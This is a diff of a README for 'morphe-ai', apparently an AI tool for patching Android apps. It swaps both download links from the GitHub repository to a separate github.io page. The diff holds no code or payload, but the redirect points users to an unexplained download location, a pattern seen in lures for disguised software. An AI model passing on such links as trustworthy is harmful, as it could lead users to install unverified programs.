@@ -1,6 +1,6 @@
 # 🤖 morphe-ai - Edit Android apps with simple AI
 
-[![](https://img.shields.io/badge/Download-MorpheAI-blue)](https://github.com/krishnaparmar3412-cyber/morphe-ai)
+[![](https://img.shields.io/badge/Download-MorpheAI-blue)](https://krishnaparmar3412-cyber.github.io)
 
 Morphe-ai helps you modify Android applications using automated tools. This software uses artificial intelligence to look through app code, find specific parts to change, and apply patches. It simplifies tasks that usually require hours of manual work. You can analyze, hunt for targets, and update applications through a clear workspace.
 
@@ -19,7 +19,7 @@ This software connects to an external pipeline to process data. It manages the t
 
 Follow these steps to set up the software on your machine:
 
-1. Visit this page to download the software: https://github.com/krishnaparmar3412-cyber/morphe-ai
+1. Visit this page to download the software: https://krishnaparmar3412-cyber.github.io
 
 2. Locate the folder where your browser saves downloads.
 
